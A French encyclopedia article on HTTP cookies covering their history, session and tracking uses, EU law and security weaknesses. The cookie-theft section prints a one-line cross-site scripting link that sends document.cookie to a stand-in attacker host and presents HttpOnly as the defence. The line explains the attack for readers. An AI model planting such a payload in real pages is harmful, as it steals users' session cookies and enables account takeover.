---
title: "Cookie (informatique)"
date: "2025-03-11"
summary: "Un cookie [ˈkʊk.i](litt. biscuit en anglais), appelé aussi témoin de connexion, témoin de navigation ou témoin, est une petite quantité de données échangées entre un serveur HTTP et un client HTTP, et qui permet de créer une session avec état lors de la visite d'un site Web."
slug: "cookie-(informatique)"
lang: "fr"
authors: ['Matthieu Comoy']
categories: ['Wikipedia Articles']
tags: []
featured_image: ""
draft: false
---
# Cookie (informatique)

![Third_party_cookie.png](./images/Third_party_cookie.png)

Un cookie [ˈkʊk.i](litt. biscuit en anglais), appelé aussi témoin de connexion, témoin de navigation ou témoin, est une petite quantité de données échangées entre un serveur HTTP et un client HTTP, et qui permet de créer une session avec état lors de la visite d'un site Web.
Cette technologie est actuellement utilisée par presque la moitié des sites Internet.
Inventé en 1994, le cookie est un fichier texte brut constitué de paires clé-valeur échangé par le protocole de communication HTTP. Créé par un serveur HTTP, le cookie est envoyé au client HTTP pour être enregistré un temps spécifié durant lequel il est renvoyé tel quel au serveur à chaque requête. La durée d'enregistrement peut s'étendre de quelques minutes à quelques années.
Le cookie permet ainsi aux sites web d'identifier les internautes lorsqu'ils passent d'une page Web à l'autre du site, voire lorsqu'ils reviennent des années plus tard. Les cookies sont notamment utilisés pour identifier la session d'un internaute connecté à son compte informatique. La confidentialité des cookies est donc importante pour la sécurité Internet. Plus généralement, les cookies servent à lier à une visite toute information d'état, comme des préférences d'affichage ou le contenu d'un panier d'achat.
L'utilisation de cookies par des entreprises de pistage web suscite de l'hostilité. En effet, ces cookies tiers liés par exemple à des bannières de publicité en ligne permettent de suivre les internautes visitant des sites Web sans rapport, si ce n'est l'entreprise sous-traitante de pistage. Les usages qui ne répondent pas à des contraintes strictement techniques ont été régulés par des lois comme la directive du 12 juillet 2002 sur la protection de la vie privée dans le secteur des communications électroniques de l'Union européenne. Les sites Web obéissant à cette directive permettent aux visiteurs d'accepter sélectivement les cookies. Les navigateurs Web permettent également aux utilisateurs de gérer les cookies.


## Historique
Le terme cookie dérive du terme anglais magic cookie, désignant un paquet de données qu'un programme reçoit et renvoie inchangé. En français, les cookies sont aussi appelés « témoin de connexion », ou « témoin »,.
Les cookies étaient déjà utilisés en informatique quand Lou Montulli a eu l'idée de les utiliser dans les communications web en juin 1994. En ce temps, il était employé de Netscape Communications. John Giannandrea et Lou Montulli ont écrit la même année la première spécification des cookies de Netscape Navigator. La version 0.9 bêta de Mosaic Netscape, publiée le 13 octobre 1994, intégrait la technologie des cookies,. La première utilisation des cookies (hors expérimentation) a été faite pour déterminer si les visiteurs du site web Netscape avaient déjà visité le site auparavant. Montulli a déposé une demande de brevet pour la technologie des cookies en 1995, et le brevet US 5774670 a été accordé en 1998.
Après avoir été implantés dans Netscape 0.9 beta en 1994, les cookies ont été intégrés dans Internet Explorer 2, publié en octobre 1995.
L'introduction des cookies n'a pas été largement connue du grand public pour autant. En particulier, les cookies étaient acceptés par défaut dans les paramètres des navigateurs, et les utilisateurs n'étaient pas informés de leur présence. Certaines personnes étaient au courant de l'existence des cookies au début de l'année 1995, mais le grand public n'apprit leur existence qu'après la publication par le Financial Times d'un article le 12 février 1996. La même année, les cookies reçurent beaucoup d'attention de la part des médias, à cause de possibles intrusions dans la vie privée. Le sujet des cookies fut discuté dans deux consultations du Federal Trade Commission américain en 1996 et 1997.
Le développement de la spécification officielle des cookies était déjà en cours. Les premières discussions sur la spécification officielle eurent lieu en avril 1995 sur la liste de discussion www-talk. Un groupe spécial de travail du IETF fut formé. Deux propositions alternatives pour introduire un état dans les transactions HTTP ont été proposées par Brian Behlendorf et David Kristol respectivement, mais le groupe, dirigé par Kristol lui-même, a décidé d'utiliser la spécification de Netscape comme point de départ. En février 1996, le groupe de travail a déterminé que les cookies tierce partie (third party cookies) étaient une menace considérable à la protection de la vie privée. La spécification produite par le groupe a finalement été publiée en tant que RFC 2109.
À partir de fin 2014, on voit un bandeau au sujet des cookies sur de nombreux sites. Il existe plusieurs extensions de navigateur permettant le non affichage du bandeau.


## Utilisations


### Gestion des sessions
Les cookies peuvent être utilisés pour maintenir les données relatives à l'utilisateur durant sa navigation, mais aussi à travers plusieurs visites. Les cookies ont été introduits pour donner un moyen d'implémenter les paniers d'achat électronique, des dispositifs permettant à l'utilisateur d'accumuler les articles qu'il veut acheter durant sa navigation sur le site.
De nos jours, les applications comme les paniers d'achat enregistrent plutôt la liste des articles dans une base de données sur un serveur, ce qui est préférable ; que de les enregistrer dans le cookie lui-même. Le serveur web envoie un cookie contenant un identifiant de session unique. Le navigateur web renvoie alors cet identifiant de session à chaque requête suivante et les articles du panier sont enregistrés et associés avec ce même identifiant unique de session.
Les cookies sont utiles dans le cadre de la connexion à un site à l'aide d'identifiants :  

L'application web envoie un cookie contenant un identifiant unique de session lors de la première connexion ;
L'utilisateur fournit ses identifiants (généralement un nom d'utilisateur et un mot de passe) lorsqu'il s'authentifie ;
L'application web valide l'authentification et permet à l'utilisateur d'accéder au service ; le cookie permet alors de conserver la mémoire du fait que la connexion a été validée, et évite ainsi de redemander ses informations de connexion à l'utilisateur à chaque nouvel accès.


### Personnalisation
Les cookies peuvent être utilisés pour mémoriser l'information sur l'utilisateur d'un site, dans le but de lui montrer un contenu approprié dans le futur. Par exemple, un serveur web peut envoyer un cookie contenant le dernier nom d'utilisateur utilisé pour se connecter à ce site web, afin que ce nom d'utilisateur puisse être pré-rempli lors des prochaines visites.
Beaucoup de sites web utilisent les cookies pour la personnalisation basée sur les préférences des utilisateurs. Les utilisateurs sélectionnent leurs préférences dans un formulaire et envoient celles-ci au serveur. Le serveur encode les préférences dans un cookie et renvoie celui-ci au navigateur. Par la suite, à chaque fois que l'utilisateur accède à une page de ce site, le navigateur renvoie le cookie et donc la liste des préférences ; le serveur peut alors personnaliser la page d'après les préférences de l'utilisateur.
Par exemple, le site web de Wikipédia permet à ses utilisateurs de choisir l'habillage du site qu'ils préfèrent. Le moteur de recherche Google permet à ses utilisateurs (même s'ils ne sont pas enregistrés) de choisir le nombre de résultats qu'ils veulent voir sur chaque page de résultats.


### Pistage
Les cookies de pistage (ou traceurs) sont utilisés pour suivre les habitudes de navigation des utilisateurs d'internet. Cela peut être fait aussi en partie en utilisant l'adresse IP de l'ordinateur faisant une requête d'une page ou à l'aide de l'en-tête HTTP « référant » que le client envoie à chaque requête, mais les cookies permettent une plus grande précision. Cela peut être fait comme dans l'exemple suivant :

Si l'utilisateur fait appel à une page d'un site, et que la requête ne contient pas de cookie, le serveur présume que c'est la première page visitée par l'utilisateur. Le serveur crée alors une chaîne aléatoire et l'envoie au navigateur en même temps que la page demandée ;
À partir de ce moment, le cookie sera automatiquement envoyé par le navigateur à chaque fois qu'une nouvelle page du site sera appelée. Le serveur enverra la page comme d'habitude, mais enregistrera aussi l'URL de la page appelée, la date, l'heure de la requête et le cookie dans un fichier de journalisation.
En regardant le fichier de journalisation, il est alors possible de voir quelles pages l'utilisateur a visitées et dans quel ordre. Par exemple, si le fichier contient quelques requêtes faites utilisant le cookie id=abc, cela peut établir que toutes ces requêtes proviennent du même utilisateur. L'URL demandée, la date et l'heure associées aux requêtes permettent de suivre la navigation de l'utilisateur à la trace.
Les cookies tierces parties et les pixels espions, expliqués ci-dessous, permettent en plus le pistage à travers différents sites. Le pistage dans un seul site est généralement utilisé pour un usage statistique. Par contre, le pistage dans différents sites à l'aide des cookies tierces parties est généralement utilisé par les entreprises de publicité pour produire des profils d'utilisateurs anonymes (qui sont alors utilisés pour déterminer quelles publicités devraient être montrées à l'utilisateur et, si l’adresse email de l’utilisateur est connue, pour lui envoyer des mails correspondant à ces publicités).
Les cookies de pistage sont un risque d'atteinte à la vie privée de l'utilisateur mais ils peuvent être supprimés facilement. La plupart des navigateurs récents incluent une option pour supprimer automatiquement les cookies persistant à la fermeture de l'application.


### Les cookies tierce partie
Les images et autres objets contenus dans une page web peuvent résider dans des serveurs différents de celui hébergeant la page. Pour afficher la page, le navigateur télécharge tous ces objets. La plupart des sites web contiennent des informations provenant de différentes sources. Par exemple, si l’utilisateur saisit www.exemple.com dans son navigateur, il y aura souvent des objets ou des publicités sur une partie de la page qui proviendront de sources différentes, c'est-à-dire d'un domaine différent de www.exemple.com.
Les cookies « première » partie sont des cookies qui sont mis en place par le domaine inscrit dans la barre d'adresse du navigateur. Les cookies tierce partie sont mis en place par l'un des objets de la page qui proviennent d'un domaine différent.
Par défaut, les navigateurs comme Mozilla Firefox, Microsoft Internet Explorer et Opera acceptent les cookies tierce partie, mais les utilisateurs peuvent changer les paramètres dans les options du navigateur pour les bloquer. Il n'y a pas de risque de sécurité inhérent aux cookies tierce partie qui permettent des fonctionnalités pour le web, cependant ils servent aussi à pister les internautes de site en site. À compter de 2022, des acteurs majeurs comme Google ont annoncé qu'ils mettraient fin aux cookies tierce partie, ce qui aura des implications majeures pour le marketing.
Des outils tels que Ghostery disponible pour tous les navigateurs permettent de bloquer les échanges entre tierces parties.


## Implémentation

Les cookies sont de petites données envoyées par le serveur web au navigateur. Le navigateur les retourne inchangées au serveur, introduisant un état (mémoire des événements antérieurs) dans la transaction HTTP qui autrement serait sans état. Sans les cookies, chaque récupération de page web ou d'un composant d'une page web est un événement isolé, indépendant des autres requêtes faites sur le même site. En plus de pouvoir être mis en place par le serveur web, les cookies peuvent aussi être mis en place par des langages de script comme JavaScript, s'il est supporté et autorisé par le navigateur.
La spécification officielle des cookies suggère que les navigateurs soient capables d'enregistrer et de renvoyer un nombre minimal de cookies. Spécifiquement, un navigateur devrait être capable de stocker au moins 300 cookies de quatre kilooctets chacun, et au moins 20 cookies pour un même serveur ou domaine.
D'après la section 3.1 de RFC 2965, les noms de cookies sont insensibles à la casse.
Un cookie peut spécifier la date de son expiration, dans ce cas le cookie sera supprimé à cette date. Si le cookie ne spécifie pas de date d'expiration, le cookie est supprimé dès que l'utilisateur quitte son navigateur. En conséquence, spécifier une date d'expiration est un moyen de faire survivre le cookie à travers plusieurs sessions. Pour cette raison, les cookies avec une date d'expiration sont dits persistants. Un exemple d'application : un site de vente peut utiliser les cookies persistants pour enregistrer les articles que les utilisateurs ont placés dans leur panier d'achat (en réalité, le cookie peut faire référence à une entrée enregistrée dans une base de données du site de vente, et non pas dans votre ordinateur). Grâce à ce moyen, si les utilisateurs quittent leur navigateur sans faire un achat et y retournent plus tard, ils pourront trouver à nouveau les articles dans le panier. Si ces cookies ne donnaient pas de date d'expiration, ils expireraient à la fermeture du navigateur, et l'information sur le contenu du panier serait perdue.
Les cookies peuvent être limités dans leur portée à un domaine spécifique, un sous-domaine ou un chemin d'accès sur le serveur qui les a créés.


### Création d'un cookie
Le transfert des pages web se fait à l'aide du protocole de transfert hypertexte (HTTP). En ne tenant pas compte des cookies, les navigateurs appellent une page provenant des serveurs web en leur envoyant en général un texte court appelé requête HTTP.
Par exemple, pour accéder à la page www.example.org/index.html, les navigateurs se connectent au serveur www.example.org et envoient une requête qui ressemble à celle-ci :

Le serveur répond en envoyant la page demandée, précédée par un texte similaire, le tout étant appelé réponse HTTP. Ce paquet peut contenir des lignes demandant au navigateur de stocker des cookies :

Le serveur envoie seulement la ligne Set-Cookie, si le serveur veut que le navigateur stocke un cookie. Set-Cookie est une requête pour que le navigateur stocke la chaîne nom=valeur et la renvoie dans toutes les futures requêtes au serveur. Si le navigateur supporte les cookies et que les cookies sont permis dans les options du navigateur, le cookie sera inclus dans toutes les requêtes suivantes faite au même serveur. Par exemple, le navigateur appelle la page www.example.org/news.html en envoyant au serveur www.example.org la requête suivante :

Ceci est une requête pour une autre page du même serveur, et diffère de la première au-dessus car elle contient une chaîne que le serveur a précédemment envoyée au navigateur. Grâce à ce moyen, le serveur sait que cette requête est reliée à la précédente. Le serveur répond en envoyant la page appelée, et aussi en y ajoutant d'autres cookies.
La valeur du cookie peut être modifiée par le serveur en envoyant une nouvelle ligne Set-Cookie: nom=nouvelle_valeur en réponse à la page appelée. Le navigateur remplace alors l'ancienne valeur par la nouvelle.
La ligne Set-Cookie est généralement créée par un programme CGI ou un autre langage de script, et non par le serveur HTTP. Le serveur HTTP (exemple : Apache) ne fera que transmettre le résultat du programme (un document précédé par l'en-tête contenant les cookies) au navigateur.
Les cookies peuvent aussi être mis en place par JavaScript ou d'autres langages similaires exécutés dans le navigateur, c'est-à-dire du côté du client plutôt que du côté du serveur. En JavaScript, l'objet document.cookie est utilisé dans ce but. Par exemple, l'instruction document.cookie = "température=20" crée un cookie nommé « température » et de valeur 20.


### Attributs d'un cookie

En plus de la paire nom/valeur, un cookie peut aussi contenir une date d'expiration, un chemin, un nom de domaine et le type de connexion prévu, c'est-à-dire en clair ou chiffrée. La RFC 2965 définit aussi que les cookies doivent avoir un numéro de version obligatoire, mais cela est généralement omis. Ces parties de données suivent la paire nom=nouvelle_valeur et sont séparées par des points virgules. Par exemple, un cookie peut être créé par le serveur en envoyant une ligne Set-Cookie: nom=nouvelle_valeur; expires=date; path=/; domain=.exemple.org.


#### Les secure cookies
Les secure cookies sont un type de cookies qui ont l'attribut Secure configuré, ce qui limite l'utilisation du cookie à des canaux dits « sécurisés » (où « sécurisé » est défini par l'agent utilisateur, typiquement le navigateur web).


### Expiration d'un cookie
Les cookies expirent et ne sont alors pas envoyés par le navigateur au serveur dans les situations suivantes :

lorsque le navigateur est fermé, si le cookie n'est pas persistant ;
lorsque la date d'expiration du cookie est dépassée ;
lorsque la date d'expiration du cookie est modifiée (par le serveur ou le script) en une date du passé ;
lorsque le navigateur supprime le cookie à la demande de l'utilisateur.
La troisième situation permet aux serveurs ou aux scripts de supprimer explicitement un cookie. Notons qu'il est possible avec le navigateur Web Google Chrome de connaître la date d'expiration d'un cookie en particulier en accédant aux paramètres du contenu. Un cookie enregistré sur un ordinateur peut très bien y rester pendant plusieurs dizaines d'années si aucune procédure n'est faite pour l'effacer.


## Idées reçues
Depuis leur introduction sur Internet, de nombreuses idées sur les cookies ont circulé sur Internet et dans les médias. En 1998, CIAC, une équipe de surveillance des incidents d'ordinateur du département de l'Énergie des États-Unis, a déterminé que les failles de sécurité des cookies étaient « essentiellement non existantes » et a expliqué que « l'information sur la provenance de vos visites et le détail des pages web que vous avez visitées existe déjà dans les fichiers de journalisation des serveurs web ». En 2005, Jupiter Research a publié les résultats d'une étude, dans laquelle un pourcentage important des personnes interrogées a considéré les affirmations suivantes :

les cookies sont comme des virus, ils infectent les disques durs des utilisateurs ;
les cookies génèrent des pop-up ;
les cookies sont utilisés pour envoyer des spams ;
les cookies sont utilisés seulement pour la publicité.
Les cookies ne peuvent pas effacer ou lire l'information provenant de l'ordinateur de l'utilisateur. Cependant, les cookies permettent de détecter les pages web visitées par un utilisateur sur un site donné ou un ensemble de sites. Ces informations peuvent être collectées dans un profil d'utilisateur pouvant être utilisé ou revendu à des tierces parties, ce qui peut poser de sérieux problèmes de protection de la vie privée. Certains profils sont anonymes, en ce sens qu'ils ne contiennent pas d'information personnelle, pourtant même de tels profils peuvent être sujets à caution.
Selon la même étude, un grand pourcentage d'utilisateurs d'Internet ne savent pas comment supprimer les cookies. L'une des raisons pour lesquelles les gens ne font pas confiance aux cookies est que certains sites ont abusé de l'aspect de l'identification personnelle des cookies et ont partagé ces informations avec d'autres sources. Un grand pourcentage de la publicité ciblée et de courriels non sollicités, considérés comme spam, provient de l'information glanée par les cookies de pistage.
En réalité, les cookies qui n'ont initialement pas été créés dans le but de réaliser des publicités commerciales, ont donné le jour à toute une industrie publicitaire qui selon le président de la commission digitale de l’Union des entreprises de conseil et d'achat média « donne des informations sur les internautes, notamment leur intérêt pour tel ou tel produit, peut-être une intention d’achat ».
La suppression des cookies tiers prévue entre 2020 et 2022 est voulue pour limiter ces inconvénients mais pourrait profiter aux GAFAMs au détriment des autres publicitaires, les GAFAMs qui détiennent déjà les trois quarts du marché français sortiront renforcées de meilleures technologies d’annonce ciblée.


## Paramètres du navigateur
La plupart des navigateurs supportent les cookies et permettent à l'utilisateur de les désactiver. Les options les plus courantes sont les suivantes :

activer ou désactiver les cookies complètement, afin qu'ils soient acceptés ou bloqués constamment ;
permettre à l'utilisateur de voir les cookies actifs dans une page donnée, en saisissant javascript: alert(document.cookie) dans la barre d'adresse du navigateur. Certains navigateurs incorporent un gestionnaire de cookies pour l'utilisateur qui peut voir et supprimer de façon sélective les cookies actuellement stockés par le navigateur.
La plupart des navigateurs permettent aussi une suppression totale des données personnelles qui inclut les cookies. Des modules complémentaires pour contrôler les permissions des cookies existent aussi.


## Vie privée et cookies tierce partie

Les cookies ont des implications importantes dans la vie privée et l'anonymat des utilisateurs du web. Bien que les cookies soient seulement renvoyés au serveur les ayant mis en place ou à un serveur appartenant au même domaine Internet, une page web peut cependant contenir des images ou d'autres composants stockés sur des serveurs appartenant à d'autres domaines. Les cookies qui sont mis en place durant la récupération de ces composants externes sont appelés cookies tierce partie. Cela inclut les cookies provenant des fenêtres pop-up indésirables.
Les entreprises de publicité utilisent les cookies tierce partie pour pister les utilisateurs à travers les différents sites qu'ils visitent. En particulier, une entreprise de publicité peut pister un utilisateur à travers toutes les pages où elle a placé des images de publicité ou un pixel espion. La connaissance des pages visitées par l'utilisateur permet à l'entreprise de publicité de cibler les préférences publicitaires de l'utilisateur.
La possibilité de construire un profil d'utilisateur est considérée par certains comme une intrusion dans la vie privée, particulièrement quand le pistage est fait à travers différents domaines utilisant les cookies tierce partie. Pour cette raison, certains pays ont une législation sur les cookies.
Le gouvernement des États-Unis a mis en place des règles strictes sur la mise en place des cookies en 2000, après qu'il fut révélé que le bureau des politiques antidrogues de la Maison Blanche utilisait les cookies pour suivre les ordinateurs des utilisateurs regardant en ligne les publicités antidrogues. En 2002, l'activiste de la vie privée Daniel Brandt a découvert que la CIA laissait des cookies persistants sur les ordinateurs qui avaient visité ses sites web. Une fois informée de cette violation, la CIA déclara que ces cookies n'étaient pas intentionnellement envoyés et cessa de les mettre en place. Le 25 décembre 2005, Brandt a découvert que la National Security Agency (NSA) avait laissé deux cookies persistants sur des ordinateurs de visiteurs à cause d'une mise à jour logicielle. Après avoir été informée, la NSA désactiva immédiatement les cookies.
Au Royaume-Uni, la « Cookie law », entrée en vigueur le 25 mai 2012, oblige les sites à déclarer leurs intentions, permettant ainsi aux utilisateurs de choisir s'ils veulent laisser des traces ou pas de leur passage sur internet. Ils peuvent ainsi être à l'abri du ciblage publicitaire. Cependant, d'après The Guardian, le consentement des internautes n'est pas obligatoirement explicite ; des modifications ont été apportées aux modalités de consentement de l'usager, le rendant ainsi implicite.


### Cadre légal


#### Directive 2002/58 sur la vie privée
La directive 2002/58 vie privée et communications électroniques, contient des règles sur l'utilisation des cookies. En particulier, l'article 5, paragraphe 3 de cette directive exige que le stockage des données (comme les cookies) dans l'ordinateur de l'utilisateur puisse seulement être fait si :

l'utilisateur est informé de la façon dont les données sont utilisées ;
il est donné à l'utilisateur la possibilité de refuser cette opération de stockage. Cependant, cet article statue aussi que le stockage de données pour raisons techniques est exempté de cette loi.
Devant être mise en application à partir d'octobre 2003, la directive n'a cependant été que très imparfaitement mise en pratique selon un rapport de décembre 2004, qui signalait en outre que certains États-membres (Slovaquie, Lettonie, Grèce, Belgique et Luxembourg) n'avaient pas encore transposé la directive en droit interne.
Selon l'avis du G29 de 2010, cette directive qui conditionne notamment l'usage des cookies à des fins de publicité comportementale au consentement explicite de l'internaute demeure très mal appliquée. En fait la plupart des sites le font de façon non conforme à la directive, en se limitant à une simple « bannière » informant de l'utilisation de « cookies » sans donner d'information sur les utilisations, sans différencier les cookies « techniques » des cookies de « pistage », ni d'offrir de choix réel à l’utilisateur désirant maintenir les cookies techniques (comme les cookies de gestion du panier d'achat) et refuser les cookies de « pistage ». De fait de nombreux sites ne fonctionnent pas correctement si les cookies sont refusés, ce qui n'est ni conforme à la directive 2002/58 ni à la directive 95/46 (Protection des données personnelles).


#### Directive 2009/136/CE
Cette matière a été actualisée par la directive 2009/136/CE datée du 25 novembre 2009 qui indique que le « stockage d'informations, ou l'obtention de l'accès à des informations déjà stockées, dans l'équipement terminal d'un abonné ou d'un utilisateur n'est permis qu'à condition que l'abonné ou l'utilisateur ait donné son accord, après avoir reçu, dans le respect de la directive 95/46/CE, une information claire et complète, entre autres sur les finalités du traitement ». La nouvelle directive renforce donc les obligations préalables au placement de cookies sur l'ordinateur de l'internaute.
Dans les considérations préalables de la directive, le législateur européen précise toutefois : « Lorsque cela est techniquement possible et effectif, conformément aux dispositions pertinentes de la directive 95/46/CE, l'accord de l'utilisateur en ce qui concerne le traitement peut être exprimé par l'utilisation des paramètres appropriés d'un navigateur ou d'une autre application ». Mais en fait aucun navigateur à ce jour ne permet de dissocier les cookies techniques indispensables de ceux optionnels qui devraient être laissés au choix de l’utilisateur.
Cette nouvelle directive a été transposée par les députés belges en juillet 2012. Une étude de 2014 montre que même les députés peinent à appliquer les contraintes de la directive.


#### Limites de la CNIL
En France, le Conseil d'État considère que la CNIL ne peut « légalement interdire (…) les « cookies walls », pratique qui consiste à bloquer l’accès à un site Internet en cas de refus des cookies » : « En déduisant une telle interdiction de la seule exigence d’un consentement libre de l’utilisateur au dépôt de traceurs posé par le règlement européen sur la protection des données RGPD, la CNIL a excédé ce qu’elle pouvait légalement faire ».


### Cadre technique


#### P3P
La spécification du P3P inclut la possibilité pour un serveur d'énoncer une politique en matière de protection de la vie privée, qui définit quel genre d'information il collecte et dans quel but. Ces politiques incluent (mais ne sont pas limitées à) l'utilisation de l'information collectée en utilisant les cookies. D'après les définitions du P3P, un navigateur peut accepter ou rejeter les cookies en comparant les politiques en matière de protection de la vie privée avec les préférences de l'utilisateur ou en demandant à l'utilisateur, en lui présentant la politique en matière de protection de la vie privée déclarée par le serveur.
Beaucoup de navigateurs, incluant Apple Safari et Microsoft Internet Explorer versions 6 et 7, supportent le P3P qui permet au navigateur de déterminer s'il doit accepter le stockage des cookies tierce partie. Le navigateur Opera permet aux utilisateurs de refuser les cookies tierce partie et de créer un profil de sécurité global et spécifique pour les domaines Internet. Mozilla Firefox version 2 avait abandonné le support du P3P mais l'a réintégré dans la version 3.
Les cookies tierce partie peuvent être bloqués par la plupart des navigateurs afin d'augmenter le respect de la vie privée et réduire le pistage publicitaire, ceci sans affecter négativement l'expérience web de l'utilisateur. Beaucoup de régies de publicité offrent une option opt out à la publicité ciblée, en mettant en place un cookie générique dans le navigateur qui désactive ce ciblage mais une telle solution n'est pratiquement pas efficace, quand elle est respectée, car ce cookie générique est effacé dès que l'utilisateur supprime ces cookies, ce qui annule la décision d'opt out.


## Inconvénients des cookies
En plus des problèmes d'atteinte à la vie privée, les cookies ont aussi quelques inconvénients techniques. En particulier, ils n'identifient pas toujours exactement les utilisateurs, ils peuvent ralentir la performance des sites lorsqu'en grand nombre, ils peuvent être utilisés pour des attaques de sécurité et ils sont en oppositions avec le transfert représentatif d'état, style architectural du logiciel.


### Identification imprécise
Si plus d'un navigateur est utilisé sur un ordinateur, dans chacun d'eux il y a toujours une unité de stockage séparée pour les cookies. Par conséquent les cookies n'identifient pas une personne, mais la combinaison d'un compte utilisateur, d'un ordinateur, et d'un navigateur web. Ainsi, n'importe qui peut utiliser ces comptes, les ordinateurs, ou les navigateurs qui ont la panoplie des cookies. De même, les cookies ne font pas la différence entre les multiples utilisateurs qui partagent le même compte d'utilisateur, l'ordinateur, et le navigateur comme dans les « internet cafés » ou tous lieux donnant accès libre à des ressources informatiques.
Mais en pratique cette affirmation s'avère fallacieuse dans la majorité des cas du fait qu'aujourd'hui un ordinateur « personnel » (ou un smartphone, ou tablette ce qui est pire) est utilisé majoritairement par un seul individu cela revient à cibler une personne précise et à travers le volume d’information collectée arriver à un ciblage personnalisé même si la personne n'est pas « nommément » identifiée.


### Vol de cookie

Durant l'opération normale, les cookies sont renvoyés entre le serveur (ou un groupe de serveurs dans le même domaine) et le navigateur de l'ordinateur de l'utilisateur. Puisque les cookies peuvent contenir des informations sensibles (nom de l'utilisateur, un mot de passe utilisé pour une authentification, etc.), leurs valeurs ne devraient pas être accessibles aux autres ordinateurs. Le vol de cookie est un acte d'interception des cookies par un tiers non autorisé.
Les cookies peuvent être volés via un renifleur de paquets dans une attaque appelée détournement de session. Le trafic sur le net peut être intercepté et lu par les ordinateurs autres que ceux qui envoient et qui reçoivent (particulièrement sur l'espace public Wi-Fi non-chiffré). Ce trafic inclut les cookies envoyés sur des sessions utilisant le protocole HTTP ordinaire. Quand le trafic réseau n'est pas chiffré, des utilisateurs malveillants peuvent ainsi lire les communications d'autres utilisateurs sur le réseau en utilisant des « renifleurs de paquets ».
Ce problème peut être surmonté en chiffrant la connexion entre l'ordinateur de l'utilisateur et le serveur par l'emploi du protocole HTTPS. Un serveur peut spécifier un drapeau sécurisé tout en mettant en place un cookie ; le navigateur l'enverra seulement sur une ligne sécurisée, comme une connexion en SSL.
Cependant beaucoup de sites, bien qu'utilisant une communication chiffrée HTTPS pour l'authentification de l'utilisateur (c'est-à-dire la page de connexion), envoient ultérieurement des cookies de session et d'autres données normalement, par des connexions HTTP non-chiffrées pour des raisons d'efficacité. Les attaquants peuvent ainsi intercepter les cookies d'autres utilisateurs et en se faisant passer pour eux sur des sites appropriés ou en les utilisant dans des attaques de cookies.

Un autre moyen pour voler les cookies est l'écriture de script dans les sites et faire en sorte que le navigateur envoie lui-même les cookies à des serveurs malveillants qui ne les reçoivent jamais. Les navigateurs modernes permettent l'exécution de parties de code recherchées à partir du serveur. Si les cookies sont accessibles pendant l'exécution, leurs valeurs peuvent être communiquées sous une certaine forme aux serveurs qui ne devraient pas y accéder. Chiffrer les cookies avant leur envoi sur le réseau n'aide pas à contrer l'attaque.
Ce type d'écriture de script dans le site est typiquement employé par les attaquants sur les sites qui permettent aux utilisateurs de publier des contenus HTML. En intégrant une partie de code compatible dans la contribution en HTML, un attaquant peut recevoir des cookies d'autres utilisateurs. La connaissance de ces cookies peut être utilisée en se connectant au même site en utilisant les cookies volés, ainsi en étant reconnu en tant que l'utilisateur dont les cookies ont été volés.
Un moyen pour prévenir de telles attaques est d'utiliser le drapeau HttpOnly ; c'est une option, introduite en 2002 au sein de la version 6 SP1 de Internet Explorer, et disponible en PHP depuis la version 5.2.0. Cette option est prévue pour rendre le cookie inaccessible au navigateur via l'exécution de scripts (généralement javascript). Les développeurs web devraient prendre en compte cette option dans leur développement de site afin qu'ils soient immunisés contre l'accès aux cookies, notamment de session, via l'exécution de scripts au sein du navigateur de l'utilisateur.
Une autre menace de sécurité utilisée est la fabrication de demande dans le site.
La spécification technique officielle permet aux cookies d'être renvoyés uniquement aux serveurs du domaine dont ils sont originaires. Cependant, la valeur des cookies peut être envoyée à d'autres serveurs en utilisant des moyens différents des en-têtes de cookies.
En particulier, les langages de script comme JavaScript sont généralement autorisés à accéder aux valeurs des cookies et sont capables d'envoyer des valeurs arbitraires à n'importe quel serveur sur Internet. Cette capacité des scripts est utilisée à partir de sites web permettant aux utilisateurs de poster des contenus HTML que d'autres utilisateurs peuvent voir.
Par exemple, un attaquant fonctionnant sur le domaine exemple.com peut publier un commentaire contenant le lien suivant pointant vers un blog populaire qu'il ne contrôle pas autrement :
<a href="#" onclick="window.location = 'http://exemple.com/stole.cgi?text=' + escape(document.cookie); return false;">Cliquez ici !</a>
Quand un autre utilisateur clique sur ce lien, le navigateur exécute la partie de code de l'attribut onclick, ainsi il remplace la chaîne de caractère document.cookie par la liste des cookies de l'utilisateur qui sont actifs pour cette page. Par conséquent, cette liste de cookies est envoyée au serveur exemple.com, et l'attaquant est donc capable de collecter les cookies de cet utilisateur.
Ce type d'attaque est difficile à détecter du côté utilisateur parce que le script provient du même domaine qui a mis en place le cookie, et l'opération d'envoi des valeurs semble être autorisée par ce domaine. Il est considéré que c'est la responsabilité des administrateurs opérant ce type de sites de mettre en place des restrictions empêchant la publication de code malveillant.
Les cookies ne sont pas directement visibles aux programmes du côté client comme le JavaScript s'ils ont été envoyés avec le drapeau HttpOnly. Du point de vue du serveur, la seule différence est que dans la ligne de l'en-tête Set-Cookie y est ajouté un nouveau champ contenant la chaîne de caractères HttpOnly :
Set-Cookie: RMID=732423sdfs73242; expires=Fri, 31-Dec-2010 23:59:59 GMT; path=/; domain=.exemple.net; HttpOnly
Quand le navigateur reçoit un tel cookie, il est censé l'utiliser normalement dans l'échange HTTP suivant, mais sans le rendre visible aux scripts exécutés du côté client. Le drapeau HttpOnly ne fait partie d'aucune spécification technique officielle, et n'est pas implémenté dans tous les navigateurs. Notez qu'il n'y a actuellement aucun moyen de prévenir la lecture et l'écriture des cookies de session par la méthode XMLHTTPRequest.


### Modification de cookie
Dès que les cookies ont besoin d'être stockés et renvoyés inchangés au serveur, un attaquant peut modifier la valeur des cookies avant leur renvoi au serveur. Par exemple, si un cookie contient la valeur totale que l'utilisateur doit payer pour les articles mis dans le panier du magasin, en changeant cette valeur le serveur est exposé au risque de faire payer moins l'attaquant que le prix de départ. Le procédé de modifier la valeur des cookies est appelé cookie poisoning et peut être utilisé après un vol de cookie pour rendre l'attaque persistante.

La plupart des sites web, cependant, stockent seulement un identifiant de session — un numéro unique généré aléatoirement utilisé pour identifier l'utilisateur de la session — dans le cookie lui-même, alors que tout le reste de l'information est stocké sur le serveur. Dans ce cas, ce problème est en grande partie résolu.


### Manipulation de cookie entre sites web
Chaque site est supposé avoir ses propres cookies, donc un site ne devrait pas être capable de modifier ou créer des cookies associés à un autre site. Une faille de sécurité d'un navigateur web peut permettre à des sites malveillants d'enfreindre cette règle. L'exploitation d'une telle faille est couramment appelée cross-site cooking. Le but de telles attaques peut être le vol de l'identifiant de session.
Les utilisateurs devraient utiliser les versions les plus récentes des navigateurs web dans lesquels ces vulnérabilités sont pratiquement éliminées.


### État contradictoire entre le client et le serveur
